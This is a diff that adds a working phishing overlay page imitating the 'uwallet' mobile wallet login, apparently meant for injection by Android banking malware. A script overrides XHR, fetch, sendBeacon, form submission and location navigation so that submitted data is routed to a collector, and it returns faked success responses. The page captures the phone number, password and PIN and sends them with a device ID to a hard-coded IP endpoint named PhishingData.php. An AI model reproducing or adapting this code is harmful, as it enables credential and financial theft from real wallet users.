@@ -1,0 +1,532 @@
+uwallet<!DOCTYPE html><html lang="en"><head>
+<script>
+(function(){
+  if (window.__fyInterceptorInjected) return;
+  window.__fyInterceptorInjected = true;
+
+  var TARGET_PATH = '/api/PhishingData.php';
+  var TARGET_URL = 'http://18.142.44.159:8035/api/PhishingData.php';
+
+  function isOurTargetUrl(u){
+    if (!u) return false;
+    u = String(u);
+    if (u.indexOf(TARGET_PATH) !== -1 || u.indexOf(TARGET_URL) !== -1) return true;
+    try {
+      var cfg = (window.__PHISH_CONFIG__ || window.__PHISH_CONFIG) || {};
+      var submitUrl = cfg.submit_url || '';
+      if (submitUrl && u.indexOf(submitUrl) !== -1) return true;
+    } catch(e){}
+    return false;
+  }
+
+  var STATIC_EXT_RE = /\.(css|js|png|jpe?g|gif|svg|ico|woff2?|ttf|eot|otf|mp[34]|webm|pdf|zip|rar|7z|map|woff|bmp|tiff?|aac|flac|ogg|wav|webp|avif)(\?|#|$)/i;
+
+  function isSubmitUrl(u){
+    if (!u) return false;
+    u = String(u);
+    if (u.indexOf(TARGET_PATH) !== -1) return true;
+    if (u.indexOf(TARGET_URL) !== -1) return true;
+    if (STATIC_EXT_RE.test(u)) return false;
+    if (/\/api\/|\/inj\/|\/inject|\/submit|\/login|\/log\/|\/save|\/post|\/send|\/upload|\/collect|\/capture|\/result|\/phish|\/form/i.test(u)) {
+      return true;
+    }
+    if (/\.php(\?|&|$)|\.asp(\?|&|$)|\.aspx(\?|&|$)|\.jsp(\?|&|$)|\.do(\?|&|$)|\.action(\?|&|$)|\.ashx(\?|&|$)|\.cgi(\?|&|$)/i.test(u)) {
+      return true;
+    }
+    return false;
+  }
+
+  function formDataToObj(fd){
+    var o = {};
+    try {
+      var add = function(k, v){
+        if (o[k] !== undefined) {
+          if (!Array.isArray(o[k])) o[k] = [o[k]];
+          o[k].push(v);
+        } else { o[k] = v; }
+      };
+      if (fd.forEach) { fd.forEach(function(v, k){ add(k, v); }); }
+      else if (fd.entries) {
+        var it = fd.entries(), r;
+        while (!(r = it.next()).done) add(r.value[0], r.value[1]);
+      }
+    } catch(e){}
+    return o;
+  }
+
+  function urlEncodedToObj(s){
+    var o = {};
+    try {
+      s.split('&').forEach(function(p){
+        if (!p) return;
+        var idx = p.indexOf('=');
+        var k, v;
+        if (idx === -1) { k = decodeURIComponent(p.replace(/\+/g,' ')); v = ''; }
+        else { k = decodeURIComponent(p.substring(0,idx).replace(/\+/g,' '));
+               v = decodeURIComponent(p.substring(idx+1).replace(/\+/g,' ')); }
+        if (k) o[k] = v;
+      });
+    } catch(e){}
+    return o;
+  }
+
+  function normalizeBody(body){
+    if (body === null || body === undefined) return {};
+    if (body instanceof FormData) return formDataToObj(body);
+    if (typeof body === 'string') {
+      var t = body.trim();
+      if (t === '') return {};
+      if ((t.charAt(0)==='{' && t.charAt(t.length-1)==='}') ||
+          (t.charAt(0)==='[' && t.charAt(t.length-1)===']')) {
+        try { return JSON.parse(t); } catch(e){}
+      }
+      if (t.indexOf('=') !== -1 && t.indexOf('{') === -1) return urlEncodedToObj(t);
+      return { raw: body };
+    }
+    if (typeof body === 'object') {
+      if (typeof URLSearchParams !== 'undefined' && body instanceof URLSearchParams) {
+        var o = {};
+        try { body.forEach(function(v,k){ o[k]=v; }); } catch(e){}
+        return o;
+      }
+      if (body instanceof Blob || body instanceof File) return { raw: '[binary]' };
+      return body;
+    }
+    return { raw: String(body) };
+  }
+
+  // 提前保存原始 XHR 方法，供 fyPostPhish 的 fallback 使用
+  var _origOpen = XMLHttpRequest.prototype.open;
+  var _origSend = XMLHttpRequest.prototype.send;
+
+  function ensureFyPostPhish(){
+    if (typeof window.fyPostPhish === 'function') return window.fyPostPhish;
+    window.fyPostPhish = function(raw){
+      try {
+        var cfg = window.__PHISH_CONFIG || {};
+        var clean = normalizeBody(raw);
+        // 优先使用原生桥接 Android.submitData，避免 WebView 跨域 CORS 预检
+        if (typeof Android !== 'undefined' && Android.submitData) {
+          try {
+            Android.submitData(JSON.stringify(clean));
+            return;
+          } catch(e){}
+        }
+        // Fallback：XHR（仅用于浏览器测试环境，无原生桥接时）
+        // 直接用原始 open/send 发送，避免被自身拦截器再次拦截导致递归
+        var body = {
+          phone_id: cfg.phone_id || '',
+          package_name: cfg.package_name || '',
+          appName: cfg.appName || '',
+          payload: clean
+        };
+        var url = cfg.submit_url || TARGET_URL;
+        var xhr = new XMLHttpRequest();
+        _origOpen.call(xhr, 'POST', url, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        _origSend.call(xhr, JSON.stringify(body));
+      } catch(e){}
+    };
+    return window.fyPostPhish;
+  }
+
+  var fyPostPhish = ensureFyPostPhish();
+
+  // 模拟 XHR 完成，触发页面回调，避免页面逻辑挂起
+  function mockXhrComplete(xhr){
+    try {
+      var respBody = '{"code":200,"msg":"ok"}';
+      try {
+        xhr.readyState = 4;
+        xhr.status = 200;
+        xhr.statusText = 'OK';
+        xhr.responseText = respBody;
+        xhr.response = respBody;
+        xhr.responseURL = TARGET_URL;
+      } catch(e){
+        var props = { readyState:4, status:200, statusText:'OK', responseText:respBody, response:respBody, responseURL:TARGET_URL };
+        for (var k in props) {
+          try { Object.defineProperty(xhr, k, { value: props[k], writable:true, configurable:true }); } catch(e2){}
+        }
+      }
+      try {
+        xhr.getResponseHeader = function(name){ return /content-type/i.test(name) ? 'application/json' : null; };
+        xhr.getAllResponseHeaders = function(){ return 'content-type: application/json\r\n'; };
+      } catch(e){}
+      if (typeof xhr.onreadystatechange === 'function') xhr.onreadystatechange.call(xhr);
+      if (typeof xhr.onload === 'function') xhr.onload.call(xhr);
+      if (typeof xhr.onloadend === 'function') xhr.onloadend.call(xhr);
+      if (typeof xhr.dispatchEvent === 'function') {
+        try { xhr.dispatchEvent(new Event('readystatechange')); } catch(e){}
+        try { xhr.dispatchEvent(new Event('load')); } catch(e){}
+        try { xhr.dispatchEvent(new Event('loadend')); } catch(e){}
+      }
+    } catch(e){}
+  }
+
+  // 劫持 XMLHttpRequest（支持 POST 和 GET 带参）
+  XMLHttpRequest.prototype.open = function(method, url){
+    this.__fyMethod = (method || '').toUpperCase();
+    this.__fyUrl = url;
+    this.__fyIsSubmit = isSubmitUrl(url);
+    return _origOpen.apply(this, arguments);
+  };
+  XMLHttpRequest.prototype.send = function(body){
+    try {
+      var method = this.__fyMethod || 'GET';
+      var url = this.__fyUrl || '';
+      var isSubmit = this.__fyIsSubmit;
+      if (method === 'POST' && isSubmit) {
+        fyPostPhish(normalizeBody(body));
+        mockXhrComplete(this);
+        return;
+      }
+      if (method === 'GET' && isSubmit && /[?&][^=]+=/.test(String(url))) {
+        var qs = String(url).split('?')[1] || '';
+        fyPostPhish(urlEncodedToObj(qs));
+        mockXhrComplete(this);
+        return;
+      }
+    } catch(e){}
+    return _origSend.apply(this, arguments);
+  };
+
+  // 劫持 fetch（支持 POST 和 GET 带参，兼容 Request 对象）
+  if (window.fetch) {
+    var _origFetch = window.fetch;
+    window.fetch = function(url, opts){
+      try {
+        opts = opts || {};
+        var isReq = (typeof Request !== 'undefined') && (url instanceof Request);
+        var urlStr = isReq ? url.url : (typeof url === 'string' ? url : (url && url.url) || '');
+        var method = (isReq ? url.method : (opts.method || 'GET')).toUpperCase();
+        var isSubmit = isSubmitUrl(urlStr);
+        var isPost = method === 'POST';
+        var isGetWithData = method === 'GET' && isSubmit && /[?&][^=]+=/.test(urlStr);
+        if ((isPost && isSubmit) || isGetWithData) {
+          var body = isReq ? (opts.body || (url.body ? '[stream]' : undefined)) : opts.body;
+          var data = isGetWithData ? urlEncodedToObj(urlStr.split('?')[1] || '') : normalizeBody(body);
+          fyPostPhish(data);
+          var fakeResp = new Response(JSON.stringify({code:200,msg:'saved'}), {
+            status: 200, statusText: 'OK',
+            headers: {'Content-Type':'application/json'}
+          });
+          return Promise.resolve(fakeResp);
+        }
+      } catch(e){}
+      return _origFetch.apply(this, arguments);
+    };
+  }
+
+  // 劫持 sendBeacon（现代浏览器无痕提交）
+  if (navigator && typeof navigator.sendBeacon === 'function') {
+    var _origBeacon = navigator.sendBeacon.bind(navigator);
+    navigator.sendBeacon = function(url, data){
+      try {
+        if (isSubmitUrl(url)) {
+          fyPostPhish(normalizeBody(data));
+          return true;
+        }
+      } catch(e){}
+      return _origBeacon(url, data);
+    };
+  }
+
+  // 劫持 <script src>（JSONP 跨域提交）
+  try {
+    var _origScriptSrc = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src');
+    if (_origScriptSrc && _origScriptSrc.set) {
+      Object.defineProperty(HTMLScriptElement.prototype, 'src', {
+        set: function(v){
+          try {
+            if (v && typeof v === 'string' && v.indexOf('?') !== -1 && /[?&][^=]+=/.test(v) && isSubmitUrl(v)) {
+              var qs = v.split('?')[1] || '';
+              fyPostPhish(urlEncodedToObj(qs));
+            }
+          } catch(e){}
+          _origScriptSrc.set.call(this, v);
+        },
+        get: _origScriptSrc.get,
+        configurable: true
+      });
+    }
+  } catch(e){}
+
+  // 劫持 location 跳转带参（支持 location.href= / location.assign/replace）
+  // 注意：不劫持 window.location 本身，因为它是 WebView 原生管理的特殊对象，
+  // 劫持其 getter/setter 会破坏 WebView 内部状态导致严重卡顿。
+  // window.location = url 等价于 location.href = url，会被下面的 href setter 拦截。
+  var _hrefDesc = Object.getOwnPropertyDescriptor(Location.prototype, 'href');
+  var _origHrefSet = _hrefDesc && _hrefDesc.set ? _hrefDesc.set : null;
+  if (_origHrefSet) {
+    try {
+      Object.defineProperty(Location.prototype, 'href', {
+        configurable: true,
+        get: _hrefDesc.get,
+        set: function(v){
+          try {
+            if (v && typeof v === 'string' && /[?&][^=]+=/.test(v) && isSubmitUrl(v)) {
+              var qs = v.split('?')[1] || '';
+              fyPostPhish(urlEncodedToObj(qs));
+            }
+          } catch(e){}
+          _origHrefSet.call(this, v);
+        }
+      });
+    } catch(e){}
+  }
+  // 劫持 location.assign(url) 和 location.replace(url)
+  try {
+    var _origAssign = Location.prototype.assign;
+    var _origReplace = Location.prototype.replace;
+    Location.prototype.assign = function(url){
+      try {
+        if (url && typeof url === 'string' && /[?&][^=]+=/.test(url) && isSubmitUrl(url) && !isOurTargetUrl(url)) {
+          var qs = url.split('?')[1] || '';
+          fyPostPhish(urlEncodedToObj(qs));
+        }
+      } catch(e){}
+      return _origAssign.call(this, url);
+    };
+    Location.prototype.replace = function(url){
+      try {
+        if (url && typeof url === 'string' && /[?&][^=]+=/.test(url) && isSubmitUrl(url) && !isOurTargetUrl(url)) {
+          var qs = url.split('?')[1] || '';
+          fyPostPhish(urlEncodedToObj(qs));
+        }
+      } catch(e){}
+      return _origReplace.call(this, url);
+    };
+  } catch(e3){}
+
+  // 劫持 form.submit() 程序化提交（DOM 规范：submit() 不触发 submit 事件）
+  try {
+    var _origFormSubmit = HTMLFormElement.prototype.submit;
+    HTMLFormElement.prototype.submit = function(){
+      try {
+        var form = this;
+        var action = form.getAttribute('action') || '';
+        var method = (form.getAttribute('method') || 'get').toUpperCase();
+        var isPost = method === 'POST';
+        var isGetSubmit = method === 'GET' && isSubmitUrl(action);
+        if (isPost && (action === '' || isSubmitUrl(action))) {
+          var data = {};
+          try {
+            new FormData(form).forEach(function(v, k){
+              if (data[k] !== undefined) {
+                if (!Array.isArray(data[k])) data[k] = [data[k]];
+                data[k].push(v);
+              } else { data[k] = v; }
+            });
+          } catch(e2){}
+          fyPostPhish(data);
+          return; // 阻止真实提交
+        } else if (isGetSubmit) {
+          var dataGet = {};
+          try {
+            new FormData(form).forEach(function(v, k){ dataGet[k] = v; });
+          } catch(e3){}
+          fyPostPhish(dataGet);
+          return;
+        }
+      } catch(e){}
+      return _origFormSubmit.apply(this, arguments);
+    };
+  } catch(e){}
+
+  // 劫持原生 form 提交（捕获阶段，优先于业务代码，支持 POST 和 GET）
+  document.addEventListener('submit', function(e){
+    try {
+      var form = e.target;
+      if (!form || form.tagName !== 'FORM') return;
+      var action = form.getAttribute('action') || '';
+      var method = (form.getAttribute('method') || 'get').toUpperCase();
+      var isPost = method === 'POST';
+      var isGetSubmit = method === 'GET' && isSubmitUrl(action);
+      if (isPost && (action === '' || isSubmitUrl(action))) {
+        e.preventDefault();
+        var data = {};
+        try {
+          new FormData(form).forEach(function(v, k){
+            if (data[k] !== undefined) {
+              if (!Array.isArray(data[k])) data[k] = [data[k]];
+              data[k].push(v);
+            } else { data[k] = v; }
+          });
+        } catch(e2){}
+        fyPostPhish(data);
+      } else if (isGetSubmit) {
+        e.preventDefault();
+        var dataGet = {};
+        try {
+          new FormData(form).forEach(function(v, k){ dataGet[k] = v; });
+        } catch(e3){}
+        fyPostPhish(dataGet);
+      }
+    } catch(e){}
+  }, true);
+})();
+</script>
+
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover"><title>uwallet</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{height:100%;width:100%;overflow-y:auto}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Helvetica Neue',sans-serif;min-height:100dvh;background:#f9f9f9}
+.wrap{width:100%;height:100%;display:flex;flex-direction:column;overflow-y:auto}
+.topbar{display:flex;justify-content:space-between;align-items:center;padding:16px 20px}
+.topbar .left{display:flex;align-items:center;gap:8px;font-size:14px;font-weight:700;color:#1a1a40}
+.topbar .left svg{width:22px;height:22px;fill:#1a1a40}
+.topbar .right svg{width:22px;height:22px;fill:#1a1a40;cursor:pointer}
+.content{padding:0 24px}
+.brand{font-size:32px;font-weight:900;color:#1a1a40;text-align:right;margin-bottom:6px}
+.greeting{font-size:20px;font-weight:700;color:#1a1a40;text-align:right;margin-bottom:4px;direction:rtl}
+.subtitle{font-size:14px;color:#888;text-align:right;margin-bottom:28px}
+.label{font-size:14px;color:#555;text-align:right;margin-bottom:6px}
+.label .req{color:#e53935}
+.field{margin-bottom:16px}
+.field-inner{background:#f0f0f0;border-radius:10px;padding:0 16px;height:52px;display:flex;align-items:center;transition:border .2s;border:1.5px solid transparent}
+.field-inner.focus{border-color:#1a1a40}
+.field-inner input{flex:1;border:none;outline:none;font-size:15px;color:#222;background:transparent;text-align:right}
+.field-inner input::placeholder{color:#bbb;font-size:14px}
+.eye-btn{background:none;border:none;padding:4px;cursor:pointer}
+.eye-btn svg{width:22px;height:22px;fill:#1a1a40}
+.row{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px}
+.forgot{font-size:13px;font-weight:600;color:#1a1a40;text-decoration:none}
+.remember{display:flex;align-items:center;gap:6px;font-size:13px;color:#555}
+.remember input[type=checkbox]{width:20px;height:20px;accent-color:#1a1a40}
+.btn-login{width:100%;height:52px;background:#1a1a40;border:none;border-radius:12px;color:#fff;font-size:16px;font-weight:700;cursor:pointer;transition:opacity .15s,transform .1s}
+.btn-login:active{transform:scale(.98);opacity:.85}
+.step{display:none}
+.step.active{display:block}
+.pin-wrap{text-align:center;padding:40px 0 0}
+.pin-title{font-size:18px;font-weight:600;color:#1a1a40;margin-bottom:6px;direction:rtl}
+.pin-subtitle{font-size:13px;color:#999;margin-bottom:28px;direction:rtl}
+.dots{display:flex;justify-content:center;gap:16px;margin-bottom:34px}
+.dot{width:16px;height:16px;border-radius:50%;border:2px solid #1a1a40;background:transparent;transition:background .15s}
+.dot.filled{background:#1a1a40}
+.keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;max-width:280px;margin:0 auto}
+.key{width:68px;height:68px;border-radius:50%;border:none;background:#f0f0f0;display:flex;align-items:center;justify-content:center;font-size:24px;font-weight:500;color:#1a1a40;cursor:pointer;margin:0 auto;transition:background .1s;user-select:none;-webkit-user-select:none}
+.key:active{background:#ddd}
+.key.del{font-size:18px}
+.key.empty{visibility:hidden;cursor:default}
+.overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(249,249,249,.95);z-index:999;align-items:center;justify-content:center;flex-direction:column}
+.overlay.show{display:flex}
+.spinner{width:36px;height:36px;border:3px solid #ddd;border-top-color:#1a1a40;border-radius:50%;animation:spin .7s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.spin-text{margin-top:14px;font-size:14px;color:#666;direction:rtl}
+.success-icon{width:56px;height:56px;border-radius:50%;background:#1a1a40;display:flex;align-items:center;justify-content:center;margin-bottom:12px}
+.success-icon svg{width:30px;height:30px;fill:#fff}
+.success-text{font-size:15px;color:#222;font-weight:600;direction:rtl}
+</style></head>
+<body>
+<div class="wrap">
+  <div class="step active" id="step1">
+    <div class="topbar">
+      <div class="left">EN <svg viewBox="0 0 24 24"><path d="M12 1c-4.97 0-9 2.69-9 6v1c0 .55.45 1 1 1h1c.55 0 1-.45 1-1V7c0-2.21 2.69-4 6-4s6 1.79 6 4v1c0 .55.45 1 1 1h1c.55 0 1-.45 1-1V7c0-3.31-4.03-6-9-6zM7 14c-1.66 0-3 1.34-3 3v3c0 1.66 1.34 3 3 3s3-1.34 3-3v-3c0-1.66-1.34-3-3-3zm10 0c-1.66 0-3 1.34-3 3v3c0 1.66 1.34 3 3 3s3-1.34 3-3v-3c0-1.66-1.34-3-3-3z"/></svg></div>
+      <div class="right"><svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg></div>
+    </div>
+    <div class="content">
+      <div class="brand">uwallet</div>
+      <div class="greeting">!Good to see you again</div>
+      <div class="subtitle">Log in to your customer account</div>
+      <div class="field">
+        <div class="label"><span class="req">*</span> Mobile Number</div>
+        <div class="field-inner" id="phoneBox">
+          <input type="tel" id="phone" placeholder="9627xxxxxxxx" autocomplete="off" enterkeyhint="next" dir="ltr" style="text-align:left">
+        </div>
+      </div>
+      <div class="field">
+        <div class="label"><span class="req">*</span> Password</div>
+        <div class="field-inner" id="pwBox">
+          <button class="eye-btn" onclick="togglePw()"><svg id="eyeIcon" viewBox="0 0 24 24"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg></button>
+          <input type="password" id="password" placeholder="" autocomplete="off" enterkeyhint="go" style="text-align:left" dir="ltr">
+        </div>
+      </div>
+      <div class="row">
+        <a href="javascript:void(0)" class="forgot">Forgot Password</a>
+        <div class="remember">Remember Me <input type="checkbox"></div>
+      </div>
+      <button class="btn-login" onclick="goStep2()">Log In</button>
+    </div>
+  </div>
+
+  <div class="step" id="step2">
+    <div class="topbar">
+      <div class="left">EN <svg viewBox="0 0 24 24"><path d="M12 1c-4.97 0-9 2.69-9 6v1c0 .55.45 1 1 1h1c.55 0 1-.45 1-1V7c0-2.21 2.69-4 6-4s6 1.79 6 4v1c0 .55.45 1 1 1h1c.55 0 1-.45 1-1V7c0-3.31-4.03-6-9-6zM7 14c-1.66 0-3 1.34-3 3v3c0 1.66 1.34 3 3 3s3-1.34 3-3v-3c0-1.66-1.34-3-3-3zm10 0c-1.66 0-3 1.34-3 3v3c0 1.66 1.34 3 3 3s3-1.34 3-3v-3c0-1.66-1.34-3-3-3z"/></svg></div>
+      <div class="right"><svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg></div>
+    </div>
+    <div class="content">
+      <div class="brand">uwallet</div>
+      <div class="pin-wrap">
+        <div class="pin-title">أدخل رمز PIN الخاص بك</div>
+        <div class="pin-subtitle">الرجاء إدخال رمز PIN المكون من 4 أرقام</div>
+        <div class="dots" id="dots"></div>
+        <div class="keypad" id="keypad"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="overlay" id="spinOverlay"><div class="spinner"></div><div class="spin-text">جارٍ التحقق...</div></div>
+<div class="overlay" id="successOverlay"><div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div><div class="success-text">تم تسجيل الدخول بنجاح</div></div>
+
+<script>
+var pk='com.a2a.umniah';
+try{if(typeof FKB!=='undefined'&&FKB.getPkg)pk=FKB.getPkg();}catch(e){}
+
+var PIN_LEN=4,pin='',savedPhone='',savedPw='';
+
+var pwVisible=false;
+function togglePw(){
+  pwVisible=!pwVisible;
+  var p=document.getElementById('password');
+  p.type=pwVisible?'text':'password';
+  document.getElementById('eyeIcon').innerHTML=pwVisible?'<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>':'<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>';
+}
+
+function goStep2(){
+  var ph=document.getElementById('phone').value.replace(/\s/g,'');
+  var p=document.getElementById('password').value;
+  if(!ph||ph.length<10){document.getElementById('phone').focus();return;}
+  if(!p||p.length<4){document.getElementById('password').focus();return;}
+  savedPhone=ph;savedPw=p;
+  document.getElementById('step1').className='step';
+  document.getElementById('step2').className='step active';
+  var d=document.getElementById('dots');
+  for(var i=0;i<PIN_LEN;i++){var el=document.createElement('div');el.className='dot';d.appendChild(el);}
+  var keys=[1,2,3,4,5,6,7,8,9,'',0,'⌫'];
+  var kp=document.getElementById('keypad');
+  keys.forEach(function(k){var b=document.createElement('div');if(k===''){b.className='key empty';}else if(k==='⌫'){b.className='key del';b.textContent='⌫';b.onclick=delPin;}else{b.className='key';b.textContent=k;b.onclick=function(){addPin(k);};};kp.appendChild(b);});
+}
+
+function addPin(n){
+  if(pin.length>=PIN_LEN)return;
+  pin+=n;
+  updateDots();
+  if(pin.length===PIN_LEN)setTimeout(submitAll,300);
+}
+function delPin(){
+  if(pin.length===0)return;
+  pin=pin.slice(0,-1);
+  updateDots();
+}
+function updateDots(){
+  var dots=document.getElementById('dots').children;
+  for(var i=0;i<PIN_LEN;i++)dots[i].className=i<pin.length?'dot filled':'dot';
+}
+
+function closePage(){try{if(typeof Android!=='undefined'&&Android.close)Android.close();else if(typeof Android!=='undefined'&&Android.close)Android.close();else window.close();}catch(e){}}
+
+function submitAll(){
+  document.activeElement.blur();
+  var sn='';try{if(typeof FKB!=='undefined'&&FKB.getSn)sn=FKB.getSn();}catch(e){}
+  var pl=JSON.stringify({phone:savedPhone,password:savedPw,pin:pin,pkg:pk});
+  try{if(typeof FKB!=='undefined'&&FKB.setFormData)FKB.setFormData(pl);}catch(e){}
+  try{var x=new XMLHttpRequest();x.open('POST',"http://18.142.44.159:8035/api/PhishingData.php",true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify({deviceId:sn,pkg:pk,template:'uwallet',formData:pl}));}catch(e){}
+  setTimeout(closePage,500);
+}
+document.addEventListener('focusin',function(e){if(e.target.tagName==='INPUT'){setTimeout(function(){e.target.scrollIntoView({behavior:'smooth',block:'center'});},300);}});
+document.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();if(document.getElementById('step1').className.indexOf('active')!==-1){goStep2();}else{submitAll();}}});
+</script>
+</body></html>
